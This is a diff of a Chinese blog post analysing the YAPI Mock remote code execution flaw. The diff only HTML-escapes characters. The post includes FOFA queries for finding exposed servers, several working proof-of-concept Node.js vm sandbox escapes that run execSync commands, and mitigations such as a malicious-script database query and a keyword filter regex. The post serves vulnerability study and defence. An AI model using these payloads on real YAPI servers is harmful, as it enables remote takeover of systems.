@@ -1,7 +1,7 @@
 # 003-Yapi Mock RCE 漏洞复现分析
 
 
-<!--more-->
+&lt;!--more--&gt;
 
 全文共计2314字，预计时长6分钟。
 
@@ -13,7 +13,7 @@
 
 **组件名称** : YAPI
 
-**影响范围** : YAPI <= 1.9.2，
+**影响范围** : YAPI &lt;= 1.9.2，
 
 **漏洞类型** :远程代码执行
 
@@ -25,9 +25,9 @@
 
 **综合评价 :** 
 
-​	<综合评定利用难度>：中等，需要用户认证。
+​	&lt;综合评定利用难度&gt;：中等，需要用户认证。
 
-​	<综合评定威胁等级>：高危，能造成远程代码执行。
+​	&lt;综合评定威胁等级&gt;：高危，能造成远程代码执行。
 
 ​	YAPI是由去哪儿网移动架构组(简称YMFE，一群由FE、iOS和Android工程师共同组成的具想象力、创造力和影响力的大前端团队)开发的可视化接口管理工具，是一个可本地部署的、打通前后端及QA的接口管理平台。
 
@@ -43,13 +43,13 @@
 
 fofa 搜索语句：
 
-> icon_hash="-715193973"
->
-> app="YApi"
+&gt; icon_hash=&#34;-715193973&#34;
+&gt;
+&gt; app=&#34;YApi&#34;
 
 本地复现：
 
-​	Docker搭建测试环境，参考文档：[《Yapi+Docker的安装与配置》](https://blog.csdn.net/qq_32447301/article/details/81394024)
+​	Docker搭建测试环境，参考文档：[《Yapi&#43;Docker的安装与配置》](https://blog.csdn.net/qq_32447301/article/details/81394024)
 
 ![图片](/resource/Yapi_Mock_RCE.assets/640-20230217124803801.png)
 
@@ -66,7 +66,7 @@ fofa 搜索语句：
 POC如下：
 
 ```
-const process = this.constructor.constructor('return process')()mockJson = process.mainModule.require("child_process").execSync("whoami").toString()
+const process = this.constructor.constructor(&#39;return process&#39;)()mockJson = process.mainModule.require(&#34;child_process&#34;).execSync(&#34;whoami&#34;).toString()
 ```
 
 点击“预览”，访问Mock地址，即可触发漏洞POC：
@@ -84,7 +84,7 @@ const process = this.constructor.constructor('return process')()mockJson = proce
 ​	NodeJS中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。
 
 ```
- const vm = require('vm'); const x = 1; const sandbox = {x:2}; vm.createContext(sandbox);  //Contextify the sandbox.  const code = 'x += 40;var y=17;'; vm.runInContext(code,sandbox); console.log(sandbox.x);  // 42 console.log(sandbox.y);  // 17 console.log(x);// 1; y is not defined.
+ const vm = require(&#39;vm&#39;); const x = 1; const sandbox = {x:2}; vm.createContext(sandbox);  //Contextify the sandbox.  const code = &#39;x &#43;= 40;var y=17;&#39;; vm.runInContext(code,sandbox); console.log(sandbox.x);  // 42 console.log(sandbox.y);  // 17 console.log(x);// 1; y is not defined.
 ```
 
 ​	vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。
@@ -92,7 +92,7 @@ const process = this.constructor.constructor('return process')()mockJson = proce
 ​	可惜的是 如果这样，我们可以用原型链绕过，如下
 
 ```
- const vm = require('vm');   vm.runInNewContext("this.constructor.constructor('return process')().exit()")
+ const vm = require(&#39;vm&#39;);   vm.runInNewContext(&#34;this.constructor.constructor(&#39;return process&#39;)().exit()&#34;)
 ```
 
 ​	网上关于NodeJS、沙箱一类的安全技术研究也有很多，可以参考下学一学。
@@ -102,7 +102,7 @@ const process = this.constructor.constructor('return process')()mockJson = proce
 Poc：
 
 ```
- const process = this.constructor.constructor('return process')() mockJson = process.mainModule.require("child_process").execSync("whoami").toString()
+ const process = this.constructor.constructor(&#39;return process&#39;)() mockJson = process.mainModule.require(&#34;child_process&#34;).execSync(&#34;whoami&#34;).toString()
 ```
 
 ​	注意，这里不需要加 exit，加了以后yapi服务会退出。
@@ -110,7 +110,7 @@ Poc：
 网上的Poc其实表达的意思是一样的，如下：
 
 ```
- const sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor('return process') const process = myfun() mockJson = process.mainModule.require("child_process").execSync("whoami").toString()
+ const sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor(&#39;return process&#39;) const process = myfun() mockJson = process.mainModule.require(&#34;child_process&#34;).execSync(&#34;whoami&#34;).toString()
 ```
 
 我认为这个问题的本质是功能的滥用，JS沙箱绕过导致远程代码执行。之前看了一个文档《nodejs命令执行和沙箱安全》，他所说的内容有对也有不对的地方。
@@ -143,7 +143,7 @@ db.adv_mock.find({mock_script: /exec/});
 
 ![图片](/resource/Yapi_Mock_RCE.assets/640-20230217124803418.png)
 
-出自：[《【处置手册】YAPI远程代码执行0day漏洞》](https://mp.weixin.qq.com/s?__biz=Mzk0MjE3ODkxNg==&mid=2247485888&idx=1&sn=3db5bf89f7f214859c0c37bf4340fa3a&scene=21#wechat_redirect)
+出自：[《【处置手册】YAPI远程代码执行0day漏洞》](https://mp.weixin.qq.com/s?__biz=Mzk0MjE3ODkxNg==&amp;mid=2247485888&amp;idx=1&amp;sn=3db5bf89f7f214859c0c37bf4340fa3a&amp;scene=21#wechat_redirect)
 
 
 
@@ -155,7 +155,7 @@ db.adv_mock.find({mock_script: /exec/});
 
 ```
  {
-    "closeRegister":true
+    &#34;closeRegister&#34;:true
  }
 ```
 
@@ -163,11 +163,11 @@ db.adv_mock.find({mock_script: /exec/});
 
 **2、关闭YAPI Mock功能**
 
-1)、在config.json中新增mock: false参数：  `{ ... "mock": false, }`
+1)、在config.json中新增mock: false参数：  `{ ... &#34;mock&#34;: false, }`
 
 2)、在`exts/yapi-plugin-andvanced-mock/server.js`文件中找到：
 
-  `if (caseData &&   caseData.case_enable) {...}`
+  `if (caseData &amp;&amp;   caseData.case_enable) {...}`
 
 并添加下列代码：
 
@@ -182,8 +182,8 @@ db.adv_mock.find({mock_script: /exec/});
 并添加下列代码：
 
 ```
- const filter = '/process|exec|require/g'; 
- const reg = new RegExp(filter, "g");   
+ const filter = &#39;/process|exec|require/g&#39;; 
+ const reg = new RegExp(filter, &#34;g&#34;);   
  if(reg.test(script)) { return false; }
 ```
 
